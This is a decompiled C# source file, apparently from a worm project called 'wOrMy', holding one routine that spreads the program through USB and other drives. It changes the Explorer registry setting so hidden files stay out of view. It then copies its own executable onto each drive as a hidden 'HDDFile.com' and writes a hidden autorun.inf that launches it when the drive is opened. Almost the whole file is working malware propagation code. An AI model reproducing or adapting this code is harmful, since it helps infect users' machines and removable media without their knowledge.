using System;
using System.IO;
using System.Windows.Forms;
using Microsoft.VisualBasic;
using Microsoft.VisualBasic.CompilerServices;
using Microsoft.VisualBasic.Devices;
using Microsoft.VisualBasic.FileIO;
using Microsoft.Win32;
using wOrMy.My;

namespace wOrMy;

[StandardModule]
internal sealed class usb
{
	public static void usb_sp()
	{
		int try0000_dispatch = -1;
		int num3 = default(int);
		int num2 = default(int);
		int num = default(int);
		int num5 = default(int);
		string text = default(string);
		string programFiles = default(string);
		string[] logicalDrives = default(string[]);
		string[] array = default(string[]);
		while (true)
		{
			try
			{
				/*Note: ILSpy has introduced the following switch to emulate a goto from catch-block to try-block*/;
				switch (try0000_dispatch)
				{
				default:
					ProjectData.ClearProjectError();
					num3 = -2;
					goto IL_0009;
				case 344:
					{
						num2 = num;
						if (num3 > -2)
						{
							switch (num3)
							{
							case 1:
								break;
							default:
								goto end_IL_0000;
							}
						}
						int num4 = num2 + 1;
						num2 = 0;
						switch (num4)
						{
						case 1:
							break;
						case 2:
							goto IL_0009;
						case 3:
							goto IL_002b;
						case 4:
							goto IL_0043;
						case 5:
							goto IL_004c;
						case 6:
							goto IL_0063;
						case 8:
							goto IL_0072;
						case 9:
							goto IL_0075;
						case 10:
							goto IL_009a;
						case 11:
							goto IL_00ca;
						case 12:
							goto IL_00df;
						case 14:
							goto IL_00f6;
						case 7:
						case 13:
							goto IL_00ff;
						default:
							goto end_IL_0000;
						case 15:
							goto end_IL_0000_2;
						}
						goto default;
					}
					IL_00ff:
					num5 = checked(num5 + 1);
					goto IL_00f6;
					IL_00df:
					num = 12;
					FileSystem.SetAttr(text + "autorun.inf", (FileAttribute)2);
					goto IL_00ff;
					IL_0009:
					num = 2;
					((ServerComputer)MyProject.Computer).get_Registry().SetValue("HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\Advanced", "Hidden", (object)"0", RegistryValueKind.DWord);
					goto IL_002b;
					IL_002b:
					num = 3;
					programFiles = ((ServerComputer)MyProject.Computer).get_FileSystem().get_SpecialDirectories().get_ProgramFiles();
					goto IL_0043;
					IL_0043:
					num = 4;
					logicalDrives = Directory.GetLogicalDrives();
					goto IL_004c;
					IL_004c:
					num = 5;
					array = logicalDrives;
					num5 = 0;
					goto IL_0054;
					IL_0054:
					if (num5 < array.Length)
					{
						text = array[num5];
						goto IL_0063;
					}
					goto end_IL_0000_2;
					IL_00f6:
					num = 14;
					goto IL_0054;
					IL_0063:
					num = 6;
					if (!programFiles.Contains(text))
					{
						goto IL_0072;
					}
					goto IL_00ff;
					IL_0072:
					num = 8;
					goto IL_0075;
					IL_0075:
					num = 9;
					((ServerComputer)MyProject.Computer).get_FileSystem().CopyFile(Application.get_ExecutablePath(), text + "HDDFile.com", (UIOption)(-1), (UICancelOption)2);
					goto IL_009a;
					IL_009a:
					num = 10;
					((ServerComputer)MyProject.Computer).get_FileSystem().WriteAllText(text + "autorun.inf", "[autorun]\r\nopen=" + text + "HDDFile.com\r\nshellexecute=" + text, true);
					goto IL_00ca;
					IL_00ca:
					num = 11;
					FileSystem.SetAttr(text + "HDDFile.com", (FileAttribute)2);
					goto IL_00df;
					end_IL_0000:
					break;
				}
			}
			catch (object obj) when (obj is Exception && num3 != 0 && num2 == 0)
			{
				ProjectData.SetProjectError((Exception)obj);
				try0000_dispatch = 344;
				continue;
			}
			throw ProjectData.CreateProjectError(-2146828237);
			continue;
			end_IL_0000_2:
			break;
		}
		if (num2 != 0)
		{
			ProjectData.ClearProjectError();
		}
	}
}
